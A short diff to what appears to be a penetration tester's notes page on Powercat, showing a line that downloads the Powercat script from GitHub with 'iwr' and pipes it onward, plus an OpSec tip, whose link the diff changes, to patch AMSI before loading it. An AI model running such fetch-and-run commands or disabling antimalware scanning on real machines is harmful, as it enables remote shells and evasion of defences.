@@ -13,4 +13,4 @@ iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 |
 powercat -h
 ~~~
 
-> **OpSec**: [[notes/ad/evasion-amsi|Patch AMSI]] before loading Powercat.
+> **OpSec**: [[notes/windows/amsi]] before loading Powercat.
